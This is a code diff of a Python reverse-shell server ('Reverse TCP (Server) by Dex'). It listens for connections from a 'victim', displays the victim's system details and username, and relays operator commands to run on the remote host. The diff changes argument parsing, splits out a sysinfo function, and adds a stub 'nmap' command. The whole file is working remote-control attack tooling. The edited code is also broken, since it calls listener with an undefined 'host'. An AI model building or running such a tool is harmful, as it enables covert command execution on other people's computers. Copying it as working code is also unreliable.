@@ -1,13 +1,19 @@
 import socket,getopt,os,sys
+from termcolor import colored, cprint
+
+try:
+	import nmap
+except Exception as e:
+	print(str(e))
 
 
 def usage():
 
 	print("\nReverse TCP (Server) by Dex")
 	print()
-	print("Usage: server.py -i <ip to listen on> -p <port>")
-	print("Example: server.py -i 192.168.0.60 (internal ip) -p 8000")
-	print("Example: server.py -i 53.63.215.73 (external ip) -p 1337")
+	print("Usage: server.py <ip to listen on> <port>")
+	print("Example: server.py 192.168.0.60 (internal ip) 8000")
+	print("Example: server.py 53.63.215.73 (external ip) 1337")
 	sys.exit(0)
 
 def main():
@@ -19,24 +25,13 @@ def main():
 		usage()
 
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hi:p:",["help","port="])
-	except getopt.GetoptError as err:
-		print(str(err))
+		ip = str(sys.argv[1])
+		port = int(sys.argv[2])
+	except:
+		print("[!] No Arguments Specified!")
 		usage()
-
-	for o,a in opts:
-		if o in ("-h","--help"):
-			usage()
-		elif o in ("-i","--ip"):
-			host = str(sys.argv[2])
-		elif o in("-p","--port"):
-			try:
-				port = int(sys.argv[4])
-			except:
-				exit("[!] Port parameter requires number.\n%s was supplied." % (port))
-		else:
-			assert False,"Unhandled Option"
-
+		sys.exit(1)
+	
 	listener(host,port)
 
 def listener(host,port):
@@ -59,9 +54,7 @@ def listener(host,port):
 
 	s.close()
 
-def console(conn, addr):
-	print("Connection established from %s" % (str(addr[0])))
-
+def sysinfo(conn):
 	# receives sysinfo sent by victim upon connection
 	sysinfo = conn.recv(2048)
 	sysinfo = sysinfo.decode('utf-8')
@@ -75,51 +68,71 @@ def console(conn, addr):
 	x_info += 'System Version: '+ '%s\n' % (sysinfo[4])
 	x_info += 'Username:'+ '%s\n' % (sysinfo[5])
 
-	while 1:
-		comminput = input("> ")
+	print(x_info)
 
-		if comminput == "exec":
-			comminput = comminput.encode('utf-8')
-			conn.send(comminput)
-			execinput = input("[*] Enter command to execute: ")
+def console(conn, addr):
+	print("Connection established from %s" % (str(addr[0])))
 
-			# preps input for sending across to victim.
-			execinput = execinput.encode('utf-8')
-			conn.send(execinput)
+	try:
+		while 1:
+			comminput = input("> ")
 
-			# decodes result as string.
-			result = conn.recv(1024)
-			result = result.decode('utf-8')
-			print(result)
+			if comminput == "exec":
+				comminput = comminput.encode('utf-8')
+				conn.send(comminput)
+				execinput = input("[*] Enter command to execute: ")
 
-		elif comminput == "clear":
-			os.system("clear")
-		elif comminput == "help":
-			help_list = {}
-			help_list["exec"] = "Execute argument as command on Remote Host"
-			help_list["sysinfo"] = "Display Remote System Information"
-			help_list["exit"] = "Sends exit command to Remote Host then exits"
-			help_list["clear"] = "Clears the terminal"
-			help_list["help"] = "Displays this help message"
+				# preps input for sending across to victim.
+				execinput = execinput.encode('utf-8')
+				conn.send(execinput)
 
-			returned = ("\n Command") + " - "
-			returned += ("Description\n" + ("-" * 50))
+				# decodes result as string.
+				result = conn.recv(1024)
+				result = result.decode('utf-8')
+				print(result)
 
-			for x in sorted(help_list):
-				dec = help_list[x]
-				returned += "\n  " + x + " - " + dec + "\n"
-			print(returned.rstrip("\n"))
-		elif comminput == "sysinfo":
-			print(x_info)
-		elif comminput == "exit":
-			comminput = comminput.encode('utf-8')
-			conn.send(comminput)
+			elif comminput == "clear":
+				os.system("clear")
 
-			break
-		else:
-			print("[!] Unknown Command")
+			elif comminput == "help":
+				help_list = {}
+				help_list["exec"] = "Execute argument as command on Remote Host"
+				help_list["sysinfo"] = "Display Remote System Information"
+				help_list["exit"] = "Sends exit command to Remote Host then exits"
+				help_list["clear"] = "Clears the terminal"
+				help_list["help"] = "Displays this help message"
 
+				returned = ("\n Command") + " - "
+				returned += ("Description\n" + ("-" * 50))
 
+				# puts the help output in a fancy list
+				for x in sorted(help_list):
+					dec = help_list[x]
+					returned += "\n  " + x + " - " + dec + "\n"
+				print(returned.rstrip("\n"))
+
+			elif comminput == "sysinfo":
+				sysinfo(conn)
+
+			elif comminput == "exit":
+				comminput = comminput.encode('utf-8')
+				conn.send(comminput)
+
+				break
+
+			elif comminput == "nmap":
+				print("lol")
+
+			else:
+				print("[!] Unknown Command")
+	except KeyboardInterrupt:
+		print("[!] Keyboard Interrupt Received.")
+		exitsig = "exit"
+		exitsig = exitsig.encode('utf-8')
+		conn.send(exitsig)
+		os.system('clear')
+
+	# closes the connection if loop is broken
 	conn.close()
 
 if __name__ == "__main__":
